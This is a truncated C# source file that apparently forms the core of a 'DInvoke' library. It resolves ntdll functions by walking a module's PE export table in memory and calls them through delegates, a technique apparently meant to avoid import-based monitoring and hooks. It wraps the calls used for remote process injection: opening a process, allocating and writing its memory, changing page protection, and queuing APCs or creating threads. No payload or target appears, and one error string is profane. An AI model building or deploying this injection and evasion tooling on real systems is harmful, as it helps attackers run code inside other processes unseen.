using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;

public class DInvokeCore {
	// Required NTSTATUSs 
    public enum NTSTATUS : uint {
        // Success
        Success = 0x00000000,
        Wait0 = 0x00000000,
        Wait1 = 0x00000001,
        Wait2 = 0x00000002,
        Wait3 = 0x00000003,
        Wait63 = 0x0000003f,
        Abandoned = 0x00000080,
        AbandonedWait0 = 0x00000080,
        AbandonedWait1 = 0x00000081,
        AbandonedWait2 = 0x00000082,
        AbandonedWait3 = 0x00000083,
        AbandonedWait63 = 0x000000bf,
        UserApc = 0x000000c0,
        KernelApc = 0x00000100,
        Alerted = 0x00000101,
        Timeout = 0x00000102,
        Pending = 0x00000103,
        Reparse = 0x00000104,
        MoreEntries = 0x00000105,
        NotAllAssigned = 0x00000106,
        SomeNotMapped = 0x00000107,
        OpLockBreakInProgress = 0x00000108,
        VolumeMounted = 0x00000109,
        RxActCommitted = 0x0000010a,
        NotifyCleanup = 0x0000010b,
        NotifyEnumDir = 0x0000010c,
        NoQuotasForAccount = 0x0000010d,
        PrimaryTransportConnectFailed = 0x0000010e,
        PageFaultTransition = 0x00000110,
        PageFaultDemandZero = 0x00000111,
        PageFaultCopyOnWrite = 0x00000112,
        PageFaultGuardPage = 0x00000113,
        PageFaultPagingFile = 0x00000114,
        CrashDump = 0x00000116,
        ReparseObject = 0x00000118,
        NothingToTerminate = 0x00000122,
        ProcessNotInJob = 0x00000123,
        ProcessInJob = 0x00000124,
        ProcessCloned = 0x00000129,
        FileLockedWithOnlyReaders = 0x0000012a,
        FileLockedWithWriters = 0x0000012b,

        // Informational
        Informational = 0x40000000,
        ObjectNameExists = 0x40000000,
        ThreadWasSuspended = 0x40000001,
        WorkingSetLimitRange = 0x40000002,
        ImageNotAtBase = 0x40000003,
        RegistryRecovered = 0x40000009,

        // Warning
        Warning = 0x80000000,
        GuardPageViolation = 0x80000001,
        DatatypeMisalignment = 0x80000002,
        Breakpoint = 0x80000003,
        SingleStep = 0x80000004,
        BufferOverflow = 0x80000005,
        NoMoreFiles = 0x80000006,
        HandlesClosed = 0x8000000a,
        PartialCopy = 0x8000000d,
        DeviceBusy = 0x80000011,
        InvalidEaName = 0x80000013,
        EaListInconsistent = 0x80000014,
        NoMoreEntries = 0x8000001a,
        LongJump = 0x80000026,
        DllMightBeInsecure = 0x8000002b,

        // Error
        Error = 0xc0000000,
        Unsuccessful = 0xc0000001,
        NotImplemented = 0xc0000002,
        InvalidInfoClass = 0xc0000003,
        InfoLengthMismatch = 0xc0000004,
        AccessViolation = 0xc0000005,
        InPageError = 0xc0000006,
        PagefileQuota = 0xc0000007,
        InvalidHandle = 0xc0000008,
        BadInitialStack = 0xc0000009,
        BadInitialPc = 0xc000000a,
        InvalidCid = 0xc000000b,
        TimerNotCanceled = 0xc000000c,
        InvalidParameter = 0xc000000d,
        NoSuchDevice = 0xc000000e,
        NoSuchFile = 0xc000000f,
        InvalidDeviceRequest = 0xc0000010,
        EndOfFile = 0xc0000011,
        WrongVolume = 0xc0000012,
        NoMediaInDevice = 0xc0000013,
        NoMemory = 0xc0000017,
        ConflictingAddresses = 0xc0000018,
        NotMappedView = 0xc0000019,
        UnableToFreeVm = 0xc000001a,
        UnableToDeleteSection = 0xc000001b,
        IllegalInstruction = 0xc000001d,
        AlreadyCommitted = 0xc0000021,
        AccessDenied = 0xc0000022,
        BufferTooSmall = 0xc0000023,
        ObjectTypeMismatch = 0xc0000024,
        NonContinuableException = 0xc0000025,
        BadStack = 0xc0000028,
        NotLocked = 0xc000002a,
        NotCommitted = 0xc000002d,
        InvalidParameterMix = 0xc0000030,
        ObjectNameInvalid = 0xc0000033,
        ObjectNameNotFound = 0xc0000034,
        ObjectNameCollision = 0xc0000035,
        ObjectPathInvalid = 0xc0000039,
        ObjectPathNotFound = 0xc000003a,
        ObjectPathSyntaxBad = 0xc000003b,
        DataOverrun = 0xc000003c,
        DataLate = 0xc000003d,
        DataError = 0xc000003e,
        CrcError = 0xc000003f,
        SectionTooBig = 0xc0000040,
        PortConnectionRefused = 0xc0000041,
        InvalidPortHandle = 0xc0000042,
        SharingViolation = 0xc0000043,
        QuotaExceeded = 0xc0000044,
        InvalidPageProtection = 0xc0000045,
        MutantNotOwned = 0xc0000046,
        SemaphoreLimitExceeded = 0xc0000047,
        PortAlreadySet = 0xc0000048,
        SectionNotImage = 0xc0000049,
        SuspendCountExceeded = 0xc000004a,
        ThreadIsTerminating = 0xc000004b,
        BadWorkingSetLimit = 0xc000004c,
        IncompatibleFileMap = 0xc000004d,
        SectionProtection = 0xc000004e,
        EasNotSupported = 0xc000004f,
        EaTooLarge = 0xc0000050,
        NonExistentEaEntry = 0xc0000051,
        NoEasOnFile = 0xc0000052,
        EaCorruptError = 0xc0000053,
        FileLockConflict = 0xc0000054,
        LockNotGranted = 0xc0000055,
        DeletePending = 0xc0000056,
        CtlFileNotSupported = 0xc0000057,
        UnknownRevision = 0xc0000058,
        RevisionMismatch = 0xc0000059,
        InvalidOwner = 0xc000005a,
        InvalidPrimaryGroup = 0xc000005b,
        NoImpersonationToken = 0xc000005c,
        CantDisableMandatory = 0xc000005d,
        NoLogonServers = 0xc000005e,
        NoSuchLogonSession = 0xc000005f,
        NoSuchPrivilege = 0xc0000060,
        PrivilegeNotHeld = 0xc0000061,
        InvalidAccountName = 0xc0000062,
        UserExists = 0xc0000063,
        NoSuchUser = 0xc0000064,
        GroupExists = 0xc0000065,
        NoSuchGroup = 0xc0000066,
        MemberInGroup = 0xc0000067,
        MemberNotInGroup = 0xc0000068,
        LastAdmin = 0xc0000069,
        WrongPassword = 0xc000006a,
        IllFormedPassword = 0xc000006b,
        PasswordRestriction = 0xc000006c,
        LogonFailure = 0xc000006d,
        AccountRestriction = 0xc000006e,
        InvalidLogonHours = 0xc000006f,
        InvalidWorkstation = 0xc0000070,
        PasswordExpired = 0xc0000071,
        AccountDisabled = 0xc0000072,
        NoneMapped = 0xc0000073,
        TooManyLuidsRequested = 0xc0000074,
        LuidsExhausted = 0xc0000075,
        InvalidSubAuthority = 0xc0000076,
        InvalidAcl = 0xc0000077,
        InvalidSid = 0xc0000078,
        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InsufficientResources = 0xc000009a,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        ProcessIsTerminating = 0xc000010a,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        InvalidAddress = 0xc0000141,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,

        MaximumNtStatus = 0xffffffff
    }

    [Flags]
    public enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,
        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,
        STANDARD_RIGHTS_ALL = 0x001F0000,
        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
        ACCESS_SYSTEM_SECURITY = 0x01000000,
        MAXIMUM_ALLOWED = 0x02000000,
        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL_ACCESS = 0x0000037F,

        SECTION_ALL_ACCESS = 0x10000000,
        SECTION_QUERY = 0x0001,
        SECTION_MAP_WRITE = 0x0002,
        SECTION_MAP_READ = 0x0004,
        SECTION_MAP_EXECUTE = 0x0008,
        SECTION_EXTEND_SIZE = 0x0010
    };

    [Flags]
    public enum AllocationType : ulong
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
        PROCESS_ALL_ACCESS = 0x001F0FFF,
        PROCESS_CREATE_PROCESS = 0x0080,
        PROCESS_CREATE_THREAD = 0x0002,
        PROCESS_DUP_HANDLE = 0x0040,
        PROCESS_QUERY_INFORMATION = 0x0400,
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
        PROCESS_SET_INFORMATION = 0x0200,
        PROCESS_SET_QUOTA = 0x0100,
        PROCESS_SUSPEND_RESUME = 0x0800,
        PROCESS_TERMINATE = 0x0001,
        PROCESS_VM_OPERATION = 0x0008,
        PROCESS_VM_READ = 0x0010,
        PROCESS_VM_WRITE = 0x0020,
        SYNCHRONIZE = 0x00100000
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    public struct OBJECT_ATTRIBUTES
    {
        public Int32 Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName; // -> UNICODE_STRING
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [Flags]
    public enum ThreadAccess : uint
    {
        Terminate = 0x0001,
        SuspendResume = 0x0002,
        Alert = 0x0004,
        GetContext = 0x0008,
        SetContext = 0x0010,
        SetInformation = 0x0020,
        QueryInformation = 0x0040,
        SetThreadToken = 0x0080,
        Impersonate = 0x0100,
        DirectImpersonation = 0x0200,
        SetLimitedInformation = 0x0400,
        QueryLimitedInformation = 0x0800,
        All = StandardRights.Required | StandardRights.Synchronize | 0x3ff
    }

    [Flags]
    public enum StandardRights : uint
    {
        Delete = 0x00010000,
        ReadControl = 0x00020000,
        WriteDac = 0x00040000,
        WriteOwner = 0x00080000,
        Synchronize = 0x00100000,
        Required = 0x000f0000,
        Read = ReadControl,
        Write = ReadControl,
        Execute = ReadControl,
        All = 0x001f0000,

        SpecificRightsAll = 0x0000ffff,
        AccessSystemSecurity = 0x01000000,
        MaximumAllowed = 0x02000000,
        GenericRead = 0x80000000,
        GenericWrite = 0x40000000,
        GenericExecute = 0x20000000,
        GenericAll = 0x10000000
    }

    private static IntPtr GetLibraryAddress(string DLLName, string FunctionName) {
        IntPtr hModule = GetLoadedModuleAddress(DLLName);
        if (hModule == IntPtr.Zero) {
            throw new DllNotFoundException(DLLName + ", Dll was not found or not loaded.");
        }
        IntPtr lastOutput = GetExportAddress(hModule, FunctionName);
        return lastOutput;
    }

    private static IntPtr GetLoadedModuleAddress(string DLLName) {
        Process CurrentProcess = Process.GetCurrentProcess();
        foreach (ProcessModule Module in CurrentProcess.Modules) {
            if (string.Compare(Module.ModuleName, DLLName, true) == 0) {
                IntPtr ModuleBasePointer = Module.BaseAddress;
                return ModuleBasePointer;
            }
        }
        return IntPtr.Zero;
    }

    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
        IntPtr FunctionPtr = IntPtr.Zero;
        try {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b) {
                pExport = OptHeader + 0x60;
            }
            else {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++) {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    break;
                }
            }
        }
        catch {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero) {
            // Export not found
            throw new MissingMethodException(ExportName + ", export not found.");
        }
        return FunctionPtr;
    }

    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters) {
        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
    }

    private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters) {
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
        return funcDelegate.DynamicInvoke(Parameters);
    }

    public class Delegates {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            UInt32 NewProtect,
            ref UInt32 OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtOpenProcess(
            ref IntPtr ProcessHandle,
            ProcessAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            UInt32 AllocationType,
            UInt32 Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            UInt32 BufferLength,
            ref UInt32 BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtAlertResumeThread(
            IntPtr ThreadHandle,
            uint SuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtSuspendThread(
            IntPtr ThreadHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtClose(
            IntPtr Handle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate UInt32 NtOpenThread(
            ref IntPtr ThreadHandle,
            ThreadAccess DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);
    }

    public static NTSTATUS NtCreateThreadEx(
        ref IntPtr threadHandle,
        ACCESS_MASK desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList)
    {
        // Craft an array for the arguments
        object[] funcargs =
        { threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize, attributeList };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtCreateThreadEx", typeof(Delegates.NtCreateThreadEx), ref funcargs);

        // Update the modified variables
        threadHandle = (IntPtr)funcargs[0];

        return retValue;
    }

    public static void NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
        // Craft an array for the arguments
        OldProtect = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref funcargs);

        OldProtect = (UInt32)funcargs[4];
        if (retValue != NTSTATUS.Success || retValue != NTSTATUS.Wait0) {
            throw new InvalidOperationException("shit cock happens, " + retValue);
        }
    }

    public static IntPtr NtOpenProcess(UInt32 ProcessId, ProcessAccessFlags DesiredAccess)
    {
        // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
        IntPtr ProcessHandle = IntPtr.Zero;
        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
        CLIENT_ID ci = new CLIENT_ID();
        ci.UniqueProcess = (IntPtr)ProcessId;

        // Craft an array for the arguments
        object[] funcargs = { ProcessHandle, DesiredAccess, oa, ci };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtOpenProcess", typeof(Delegates.NtOpenProcess), ref funcargs);
        if (retValue != NTSTATUS.Success && retValue == NTSTATUS.InvalidCid)
        {
            throw new InvalidOperationException("An invalid client ID was specified.");
        }
        if (retValue != NTSTATUS.Success)
        {
            throw new UnauthorizedAccessException("Access is denied.");
        }

        // Update the modified variables
        ProcessHandle = (IntPtr)funcargs[0];

        return ProcessHandle;
    }

    public static NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect) {
        // Craft an array for the arguments
        object[] funcargs ={ ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(Delegates.NtAllocateVirtualMemory), ref funcargs);
        if (retValue == NTSTATUS.AccessDenied)
        {
            // STATUS_ACCESS_DENIED
            throw new UnauthorizedAccessException("Access is denied.");
        }
        if (retValue == NTSTATUS.AlreadyCommitted)
        {
            // STATUS_ALREADY_COMMITTED
            throw new InvalidOperationException("The specified address range is already committed.");
        }
        if (retValue == NTSTATUS.CommitmentLimit)
        {
            // STATUS_COMMITMENT_LIMIT
            throw new InvalidOperationException("Your system is low on virtual memory.");
        }
        if (retValue == NTSTATUS.ConflictingAddresses)
        {
            // STATUS_CONFLICTING_ADDRESSES
            throw new InvalidOperationException("The specified address range conflicts with the address space.");
        }
        if (retValue == NTSTATUS.InsufficientResources)
        {
            // STATUS_INSUFFICIENT_RESOURCES
            throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
        }
        if (retValue == NTSTATUS.InvalidHandle)
        {
            // STATUS_INVALID_HANDLE
            throw new InvalidOperationException("An invalid HANDLE was specified.");
        }
        if (retValue == NTSTATUS.InvalidPageProtection)
        {
            // STATUS_INVALID_PAGE_PROTECTION
            throw new InvalidOperationException("The specified page protection was not valid.");
        }
        if (retValue == NTSTATUS.NoMemory)
        {
            // STATUS_NO_MEMORY
            throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
        }
        if (retValue == NTSTATUS.ObjectTypeMismatch)
        {
            // STATUS_OBJECT_TYPE_MISMATCH
            throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
        }
        if (retValue != NTSTATUS.Success)
        {
            // STATUS_PROCESS_IS_TERMINATING == 0xC000010A
            throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
        }

        BaseAddress = (IntPtr)funcargs[1];
        return retValue;
    }

    public static UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength)
    {
        // Craft an array for the arguments
        UInt32 BytesWritten = 0;
        object[] funcargs = { ProcessHandle, BaseAddress, Buffer, BufferLength, BytesWritten };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(Delegates.NtWriteVirtualMemory), ref funcargs);
        if (retValue != NTSTATUS.Success)
        {
            throw new InvalidOperationException("Failed to write memory, " + retValue);
        }

        BytesWritten = (UInt32)funcargs[4];
        return BytesWritten;
    }

    public static void NtQueueApcThread(ref IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3)
    {
        // Craft an array for the arguments
        object[] funcargs = { ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3 };

        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtQueueApcThread", typeof(Delegates.NtQueueApcThread), ref funcargs);
        if (retValue != NTSTATUS.Success)
        {
            throw new InvalidOperationException("Unable to queue APC, " + retValue);
        }
    }

    public static void NtAlertResumeThread(IntPtr ThreadHandle, uint SuspendCount) {
        // Craft an array for the arguments
